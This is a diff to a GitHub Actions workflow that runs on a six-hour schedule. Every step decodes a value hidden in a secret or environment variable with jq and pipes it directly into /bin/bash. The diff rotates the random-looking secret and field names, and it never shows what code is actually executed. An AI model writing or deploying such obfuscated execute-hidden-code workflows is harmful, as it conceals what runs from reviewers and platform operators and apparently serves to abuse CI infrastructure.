@@ -3,8 +3,7 @@ name: liaojiexcv
 on:
   workflow_dispatch:
   schedule:
-    - cron: '1 1/6 * * *'
-
+    - cron: '12 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -13,16 +12,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: liaojiexcv
         env:
-          ww8023: ${{ secrets.ww8023 }}
+          wm8: ${{ secrets.wm8 }}
         run: |
-          echo $ww8023 | jq -r .bycgt33 | /bin/bash
-          echo $q004 | jq -r .rdu39103 | /bin/bash
-          echo $tsydr62535 | jq -r .mf0 | /bin/bash
-          echo $sjk320 | jq -r .yzi57 | /bin/bash
-          echo $pust10751 | jq -r .lrgu9 | /bin/bash
-          echo $hlgnv04 | jq -r .in190 | /bin/bash
-          echo $ppfk7127 | jq -r .rir9551 | /bin/bash
-          echo $cf1 | jq -r .gohis85 | /bin/bash
-          echo $ap1 | jq -r .qq4717 | /bin/bash
-          echo $nihp5 | jq -r .kvbb505 | /bin/bash
+          echo $wm8 | jq -r .amz866 | /bin/bash
+          echo $vemz08 | jq -r .i332 | /bin/bash
+          echo $ibw0799 | jq -r .v45700 | /bin/bash
+          echo $ka27 | jq -r .f1709 | /bin/bash
+          echo $hgs674 | jq -r .bfz03435 | /bin/bash
+          echo $sl66071 | jq -r .q40 | /bin/bash
+          echo $kfolb70 | jq -r .qjhc707 | /bin/bash
 
